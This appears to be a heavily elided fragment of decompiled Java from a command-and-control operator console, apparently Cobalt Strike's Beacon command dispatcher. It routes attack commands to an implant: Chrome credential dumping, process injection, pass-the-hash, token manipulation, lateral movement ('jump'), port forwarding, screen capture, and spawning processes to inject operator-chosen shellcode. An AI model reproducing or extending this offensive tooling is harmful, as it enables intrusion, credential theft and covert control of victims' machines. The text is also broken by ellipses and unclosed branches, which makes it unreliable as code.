            ...
            if (var3.is("downloads")) {
               ...
               if (var3.is("argue")) {
                  ...
                  if (var3.is("browserpivot")) {
                     ...
                     this.master.Checkin();
                  } else if (var3.is("chromedump")) {
                     this.master.ChromeDump();
                        ...
                        if (var3.is("covertvpn")) {
                           ...
                           if (var3.is("desktop")) {
                              ...
                              if (var3.is("elevate")) {
                                 ...
                                 if (var3.is("inject")) {
                                    if (!var3.verify("IXL") && !var3.reset()) {
                                       if (!var3.verify("IX") && !var3.reset()) {
                                          if (var3.verify("IL")) {
                                             ...
                                             var11 = var3.popInt();
                                             var24 = ScListenerChooser.ListenersAll(this.client, new SafeDialogCallback() {
                                                public void dialogResult(String var1) {
                                 ...
                                 } else if (var3.is("inline-execute")) {
                                    if (var3.verify("pZ")) {
                                       var4 = var3.popString();
                                       var10 = var3.popString();
                                       this.master.InlineExecuteObject(var10, var4);
                                    } else if (var3.isMissingArguments() && var3.verify("F")) {
                                       var4 = var3.popString();
                                    ...
                                    if (var3.is("jump")) {
                                       ...
                                       if (var3.is("make_token")) {
                                       ...
                                       } else if (var3.is("printscreen")) {
                                          if (!var3.verify("IX") && !var3.reset()) {
                                             this.master.Printscreen();
                                          } else {
                                             var4 = var3.popString();
                                             var12 = var3.popInt();
                                             this.master.Printscreen(var12, var4);
                                          }
                                       } else if (var3.is("ps")) {
                                          this.master.Ps();
                                          ...
                                          if (var3.is("pth")) {
                                          ...
                                          } else if (var3.is("rportfwd_local")) {
                                             if (!var3.verify("IAI") && !var3.reset()) {
                                                if (var3.verify("AI")) {
                                                   var11 = var3.popInt();
                                                   var10 = var3.popString();
                                                ...
                                                var10 = var3.popString();
                                                var15 = var3.popInt();
                                                this.master.PortForwardLocal(var15, var10, var11);
                                             }
                                          } else if (var3.is("run")) {
                                             if (var3.verify("Z")) {
                                             ...
                                             if (!var3.verify("IX") && !var3.reset()) {
                                                ...
                                                var4 = var3.popString();
                                                var12 = var3.popInt();
                                                this.master.Screenshot(var12, var4);
                                             }
                                          } else if (var3.is("screenwatch")) {
                                             if (!var3.verify("IX") && !var3.reset()) {
                                                this.master.Screenwatch();
                                             } else {
                                                var4 = var3.popString();
                                                var12 = var3.popInt();
                                                this.master.Screenwatch(var12, var4);
                                             }
                                          ...
                                          } else if (var3.is("spunnel")) {
                                             if (!var3.verify("XAIF") && !var3.reset()) {
                                                if (var3.verify("XAI")) {
                                                   var11 = var3.popInt();
                                                   var10 = var3.popString();
                                                   var14 = var3.popString();
                                                   SafeDialogs.openFile("Select shellcode to inject", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                                      public void dialogResult(String var1) {
                                                         BeaconConsole.this.master.SpawnAndTunnel(var14, var10, var11, var1, false);
                                                      }
                                                   });
                                                }
                                             } else {
                                                ...
                                                var14 = var3.popString();
                                                var7 = var3.popString();
                                                this.master.SpawnAndTunnel(var7, var14, var12, var4, false);
                                             }
                                          } else if (var3.is("spunnel_local")) {
                                             if (!var3.verify("XAIF") && !var3.reset()) {
                                                if (var3.verify("XAI")) {
                                                   var11 = var3.popInt();
                                                   var10 = var3.popString();
                                                   ...
                                                   SafeDialogs.openFile("Select shellcode to inject", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                                      public void dialogResult(String var1) {
                                                         BeaconConsole.this.master.SpawnAndTunnel(var14, var10, var11, var1, true);
                                                      }
                                                   });
                                                }
                                             } else {
                                                ...
                                                var14 = var3.popString();
                                                var7 = var3.popString();
                                                this.master.SpawnAndTunnel(var7, var14, var12, var4, true);
                                             }
                                          } else {
                                             int var21;
                                             if (var3.is("ssh")) {
                                                ...
                                                if (var3.verify("AAF")) {
                                                   ...
                                                   final int var25 = CommonUtils.Port(var10, 22);
                                                   SafeDialogs.openFile("Select PEM file", (String)null, (String)null, false, false, new SafeDialogCallback() {
                                                      public void dialogResult(String var1) {
                                                         ...
                                                         BeaconConsole.this.master.SecureShellPubKey(var4, var3, var14, var25);
                                                      }
                                                   });
                                                }
